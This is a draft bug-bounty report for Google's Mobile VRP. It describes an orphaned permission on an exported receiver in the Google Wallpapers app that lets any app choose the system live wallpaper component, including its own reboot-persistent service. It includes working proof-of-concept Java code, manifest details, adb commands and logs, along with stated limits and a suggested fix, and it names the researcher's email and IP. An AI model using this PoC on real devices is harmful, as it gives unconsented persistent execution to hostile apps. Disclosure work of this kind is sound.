# G-F004 — Google Wallpapers: any app can choose the live wallpaper component

**Status:** draft, not submitted
**Target:** Google Mobile VRP
**Package:** `com.google.android.apps.wallpaper` (GoogleWallpapers, privileged, versionName 16)
**Category:** orphaned permission (listed under "other" in the program rules)
**CVSS 3.1:** 4.3 Medium — `AV:L/AC:L/PR:N/UI:N/S:C/C:N/I:L/A:N`

---

## FILL BEFORE SUBMITTING

- [x] external IP: `180.148.212.54`
- [ ] screenshot of the terminal showing the control run and the attacker run
- [ ] attach `poc/wallpaper-restore-poc/` as a zip (sources + the three manifests)
- [ ] re-read: does any sentence claim something not in the pasted output?

---

## Problem description

`com.google.android.apps.wallpaper` exports a broadcast receiver that is
guarded by a permission no package on the device defines:

```xml
<receiver android:name="com.google.android.apps.wallpaper.module.DownloadableRestorer"
          android:permission="com.google.pixel.livewallpaper.permission.DOWNLOAD_LIVE_WALLPAPER"
          android:exported="true">
    <intent-filter>
        <action android:name="com.google.android.apps.wallpaper.action.RESTORE_DOWNLOADABLE"/>
    </intent-filter>
</receiver>
```

A permission that nothing defines can be defined by any app, at
`protectionLevel="normal"`, and is then granted to it at install with no
prompt and no user interaction. So the guard stops nobody.

With my test apps removed, no package on the device declares that name:

```
$ adb uninstall com.cindrasec.wallpaperpoc
Success
$ adb uninstall com.cindrasec.wallpaperctl
Success
$ adb shell pm list permissions -f -g | grep -A5 'permission:com.google.pixel.livewallpaper'
$
```

Nothing is printed. After installing an app whose manifest declares it at
`normal`, the declarer is that app:

```
$ adb install -r com.cindrasec.wallpaperpoc.apk
Success
$ adb shell pm list permissions -f -g | grep -A5 'permission:com.google.pixel.livewallpaper'
  + permission:com.google.pixel.livewallpaper.permission.DOWNLOAD_LIVE_WALLPAPER
    package:com.cindrasec.wallpaperpoc
    label:null
    description:null
    protectionLevel:normal
```

An ordinary app is now the owner of the permission that guards the receiver,
and is granted it at install.

What the receiver does with the broadcast (decompiled from the APK on the
device):

```java
WallpaperInfo wallpaperInfo = (WallpaperInfo) this.$intent.getExtra("android.live_wallpaper.info");
int intExtra = this.$intent.getIntExtra("android.live_wallpaper.restore_target", 0);
LiveWallpaperInfo liveWallpaperInfo = new LiveWallpaperInfo(wallpaperInfo);
...
WallpaperSetter.setWallpaperComponent(WallpaperManager.getInstance(context), liveWallpaperInfo, intExtra);
```

and that helper:

```java
public static void setWallpaperComponent(WallpaperManager wallpaperManager,
                                         LiveWallpaperInfo liveWallpaperInfo, int i) {
    try {
        wallpaperManager.getClass().getMethod("setWallpaperComponentWithFlags", ComponentName.class, Integer.TYPE);
        wallpaperManager.setWallpaperComponentWithFlags(
                liveWallpaperInfo.mInfo.getComponent(), DefaultWallpaperPersister.destinationToFlags(i));
    } catch (NoSuchMethodException unused) {
        Log.d("WallpaperSetter", "setWallpaperComponentWithFlags not available, using setWallpaperComponent");
        wallpaperManager.setWallpaperComponent(liveWallpaperInfo.mInfo.getComponent());
    }
}
```

`setWallpaperComponent` and `setWallpaperComponentWithFlags` require
`android.permission.SET_WALLPAPER_COMPONENT`. On the device I tested:

```
$ adb shell pm list permissions -f -g | grep -A5 'permission:android.permission.SET_WALLPAPER_COMPONENT'
  + permission:android.permission.SET_WALLPAPER_COMPONENT
    package:android
    label:null
    description:null
    protectionLevel:signature|privileged

$ adb shell dumpsys package com.google.android.apps.wallpaper | grep -i WALLPAPER_COMPONENT
      android.permission.SET_WALLPAPER_COMPONENT: granted=true
```

The Wallpapers app is privileged and holds it. A third-party app cannot, and
my test app's own log line confirms it does not.

The `ComponentName` handed to that API comes straight out of an extra supplied
by whoever sent the broadcast. Nothing checks who sent it — the
`Intrinsics.checkNotNull` on the extra tests the cast, not the sender.

So an app that holds no real permission can make a privileged app perform a
`signature|privileged` action with an argument of the attacker's choosing.

## Reproduction

Two APKs, built from one source tree. They differ in one thing: whether the
manifest declares the orphaned permission. Same code, same broadcast, same
target component.

```
export ANDROID_SERIAL=<device>
F=com.fitbit.FitbitMobile/com.fitbit.livewallpaper.StepsWallpaperService

adb install -r out/control/com.cindrasec.wallpaperctl.apk
adb install -r out/attacker/com.cindrasec.wallpaperpoc.apk

./run-poc.sh control  "$F"
./run-poc.sh attacker "$F"
```

`run-poc.sh` records the wallpaper component, launches the build, polls
`dumpsys wallpaper` until the requested component appears or 45 seconds pass,
and prints both the app's log and the framework's.

The attacker app's whole request is:

```java
Intent b = new Intent("com.google.android.apps.wallpaper.action.RESTORE_DOWNLOADABLE");
b.setComponent(new ComponentName("com.google.android.apps.wallpaper",
        "com.google.android.apps.wallpaper.module.DownloadableRestorer"));
b.putExtra("android.live_wallpaper.info", wallpaperInfo);   // any installed wallpaper service
b.putExtra("android.live_wallpaper.restore_target", 0);
sendBroadcast(b);
```

## Evidence

Device: moto g (2026), Android 16, serial ZT422724JR. Both runs start from the
same wallpaper and ask for the same component, fifty seconds apart.

**Control — same code, no permission:**

```
# when   : 2026-10-22T20:51:59Z
# device : moto g - 2026 / Android 16
# build  : control (com.cindrasec.wallpaperctl)

before : ComponentInfo{com.glance.lockscreenM/...LooksWallpaperService}
asked  : ComponentInfo{com.fitbit.FitbitMobile/com.fitbit.livewallpaper.StepsWallpaperService}
after  : ComponentInfo{com.glance.lockscreenM/...LooksWallpaperService}      (waited 45s of 45s)

  I WPPOC   :   held by me: false
  I WPPOC   :   SET_WALLPAPER_COMPONENT held by me: false
  I WPPOC   : asking for component com.fitbit.FitbitMobile/com.fitbit.livewallpaper.StepsWallpaperService, restore_target=0
  I WPPOC   : broadcast sent to com.google.android.apps.wallpaper/com.google.android.apps.wallpaper.module.DownloadableRestorer

RESULT  unchanged after 45s
```

The Wallpapers app's process was never started and the framework recorded
nothing about the broadcast. It is dropped silently: the sender is told
nothing, and no `Permission Denial` line appears anywhere in unfiltered
logcat.

**Attacker — same code, with the self-declared permission:**

```
# when   : 2026-10-22T20:52:49Z
# device : moto g - 2026 / Android 16
# build  : attacker (com.cindrasec.wallpaperpoc)

before : ComponentInfo{com.glance.lockscreenM/...LooksWallpaperService}
asked  : ComponentInfo{com.fitbit.FitbitMobile/com.fitbit.livewallpaper.StepsWallpaperService}
after  : ComponentInfo{com.fitbit.FitbitMobile/com.fitbit.livewallpaper.StepsWallpaperService}      (waited 2s of 45s)

  I WPPOC   :   held by me: true
  I WPPOC   :   SET_WALLPAPER_COMPONENT held by me: false
  I WPPOC   : asking for component com.fitbit.FitbitMobile/com.fitbit.livewallpaper.StepsWallpaperService, restore_target=0
  I WPPOC   : broadcast sent to com.google.android.apps.wallpaper/com.google.android.apps.wallpaper.module.DownloadableRestorer

  V WallpaperManagerService: setWallpaperComponent
        name=ComponentInfo{com.fitbit.FitbitMobile/com.fitbit.livewallpaper.StepsWallpaperService},
        which = 1; callingPid = 23428
  V WallpaperManagerService: bindWallpaperComponentLocked:
        componentName=ComponentInfo{com.fitbit.FitbitMobile/com.fitbit.livewallpaper.StepsWallpaperService}; Which = 1
  D WallpaperManagerService: WPMS.onServiceConnected-ComponentInfo{com.fitbit.FitbitMobile/...StepsWallpaperService}
  D WallpaperManagerService: WPMS.connectLocked-ComponentInfo{com.fitbit.FitbitMobile/...StepsWallpaperService}

RESULT  the requested component is now the home wallpaper (after 2s)
```

`callingPid = 23428` is the Wallpapers app's process, started for this
broadcast. That is the framework's own record of a privileged app making the
`SET_WALLPAPER_COMPONENT`-gated call with a component chosen by an app that
does not hold that permission, and then the system binding to it.

I repeated the whole thing an hour later from a clean state — both apps
uninstalled, rebuilt and reinstalled, following the steps above verbatim — and
got the same pair: control unchanged for the full 45 seconds at 21:42:13Z,
attacker in 2 seconds at 21:43:04Z with
`setWallpaperComponent name=ComponentInfo{com.glance.lockscreenM/...LooksWallpaperService}, callingPid = 1094`
and `Start proc 1094:com.google.android.apps.wallpaper ... for broadcast` one
line before it.

The permission really is granted at install, from the device's records:

```
$ adb shell dumpsys package com.cindrasec.wallpaperpoc | grep -A3 'install permissions'
    install permissions:
      com.google.pixel.livewallpaper.permission.DOWNLOAD_LIVE_WALLPAPER: granted=true
```

And the two builds differ in that permission and nothing else, which the
device will say for itself — both installed, one mentions the name, one does
not:

```
$ for P in com.cindrasec.wallpaperctl com.cindrasec.wallpaperpoc; do
    echo "--- $P"
    adb shell pm path $P | sed 's/^/  installed: /'
    printf '  mentions of DOWNLOAD_LIVE_WALLPAPER: '
    adb shell dumpsys package $P | grep -c DOWNLOAD_LIVE_WALLPAPER
  done
--- com.cindrasec.wallpaperctl
  installed: package:/data/app/~~Q7vXd8n7hLjHhcFlCoPdaQ==/com.cindrasec.wallpaperctl-.../base.apk
  mentions of DOWNLOAD_LIVE_WALLPAPER: 0
--- com.cindrasec.wallpaperpoc
  installed: package:/data/app/~~vXM4uUh63DxycYBZ9HRTdw==/com.cindrasec.wallpaperpoc-.../base.apk
  mentions of DOWNLOAD_LIVE_WALLPAPER: 5
```

**The component can be the attacker's own code.** A third build adds a
`WallpaperService` to the same app and points the receiver at it:

```
before : ComponentInfo{com.android.systemui/com.android.systemui.wallpapers.ImageWallpaper}
after  : ComponentInfo{com.cindrasec.wallpapercan/com.cindrasec.wallpaperpoc.CanaryWallpaperService}

  I WPPOC   : canary engine created by the system: uid=10541 pid=16798
  D WallpaperManagerService: WPMS.onServiceConnected-ComponentInfo{com.cindrasec.wallpapercan/...CanaryWallpaperService}
  D WallpaperManagerService: WPMS.connectLocked-ComponentInfo{com.cindrasec.wallpapercan/...CanaryWallpaperService}
```

That service is started by the system, in the attacker's own process, without
the user choosing it. It survives a reboot: after `adb reboot`,
`dumpsys wallpaper` still reported the canary as the home wallpaper, so the
system starts the attacker's code again at every boot.

It does not survive a force stop, and I checked rather than assuming:

```
$ adb shell dumpsys wallpaper | grep -m1 mWallpaperComponent
  mWallpaperComponent=ComponentInfo{com.cindrasec.wallpapercan/...CanaryWallpaperService}
$ adb shell ps -A | grep wallpapercan
u0_a548  3905  970  ...  com.cindrasec.wallpapercan

$ adb shell am force-stop com.cindrasec.wallpapercan
$ adb shell ps -A | grep wallpapercan
$ adb shell dumpsys wallpaper | grep -m1 mWallpaperComponent
  mWallpaperComponent=ComponentInfo{com.android.systemui/...ImageWallpaper}
```

The process stays dead and the wallpaper reverts to the system default, so
Settings' "Force stop" does end it. The persistence claim is therefore limited
to surviving reboots, not to resisting the user.

Also reproduced on moto g stylus 5G (2024), Android 15, serial ZD222W5X3R.
Same APK, same command, and the canary started there too:

```
  I WPPOC   :   held by me: true
  I WPPOC   :   SET_WALLPAPER_COMPONENT held by me: false
  I WPPOC   : current live wallpaper: com.motorola.livewallpaper3/.wallpapers.SunlitSmileWallpaperService
  I WPPOC   : asking for component com.cindrasec.wallpapercan/...CanaryWallpaperService, restore_target=0
  I WPPOC   : canary engine created by the system: uid=10568 pid=26875

  mWallpaperComponent=ComponentInfo{com.cindrasec.wallpapercan/...CanaryWallpaperService}
```

Two different Motorola models and two Android versions, so this is not a quirk
of one device image.

## Impact

An app that holds no permission a user would ever be asked about gains a
capability that is `signature|privileged`:

- It chooses which `WallpaperService` the system runs, including its own. The
  system then starts that service and restarts it at boot, which gives the app
  a long-running process it is not otherwise entitled to, with no foreground
  service notification and no user involvement. A force stop does end it, so
  this is persistence across reboots rather than something the user cannot
  undo.
- It can replace the user's wallpaper with any installed wallpaper service.
- The wallpaper surface is full-screen behind the home screen, so whatever the
  attacker's engine draws is displayed there.

The user installs the app and opens it once. They are not prompted for any
permission at any point, and nothing else is asked of them.

## What I did not demonstrate

- **No lock screen.** I sent `restore_target=2`, which is the "both" value, and
  only the home-screen entry in `dumpsys wallpaper` changed. I am reporting
  that as an observation and not explaining it: the mechanism I first wrote
  down came from a different build of the app than the one on this device.
- **No access to anyone's data.** Nothing was read from any other app, and the
  test wallpaper draws one flat colour.
- **Not silent.** The wallpaper visibly changes, so a user looking at the home
  screen can see that something happened.
- **Sent from the foreground.** My PoC sends the broadcast from an activity, so
  the app is running in the foreground when it fires. I have not tested
  sending it from a background component such as a boot receiver, so I am not
  claiming it works without the app being opened.
- **Pixel behaviour unknown.** The permission name suggests it is defined by
  `com.google.pixel.livewallpaper`, and that package is absent from both
  devices I tested:

  ```
  $ adb shell pm path com.google.pixel.livewallpaper
  $ adb shell pm list packages | grep -i pixel.livewallpaper
  $
  ```

  (nothing, on both serials). The app also still contains the client code that
  would talk to it — `IpcDownloadableService` binds
  `com.google.pixel.livewallpaper/.split.DownloadService` — so the guard looks
  like it was written for a device where that package exists. I have not
  checked a Pixel, so I cannot say whether the guard works there; I can only
  say it does not work here.

## Root cause and suggested fix

The receiver depends on a permission defined by a package that is not present
on these devices, so the declared guard has no effect: any app can define the
name itself at `normal` and be granted it.

Two things would need to change:

1. The receiver should not be exported, or should be guarded by a permission
   the Wallpapers app itself defines at `signature`, so the name cannot be
   claimed by a third party.
2. The handler should not pass a caller-supplied `ComponentName` to
   `setWallpaperComponentWithFlags`. If the restore path must accept one, it
   should verify the sending package before acting on it.

## Researcher

- Md. Azmol Haque Rony — azmolhaque95@gmail.com — handle `cindrasec`
- Tested 2026-10-22/23 (UTC), from external IP `180.148.212.54`
- Devices: moto g (2026) Android 16 `ZT422724JR`; moto g stylus 5G (2024)
  Android 15 `ZD222W5X3R`. Both unrooted, both with the stock preinstalled
  `com.google.android.apps.wallpaper` (`/system_ext/priv-app/GoogleWallpapers`,
  versionName 16).
- Tools: adb, apktool/jadx for reading the installed APK, and the PoC in
  `poc/wallpaper-restore-poc/` built with javac + d8 + aapt2 + apksigner.
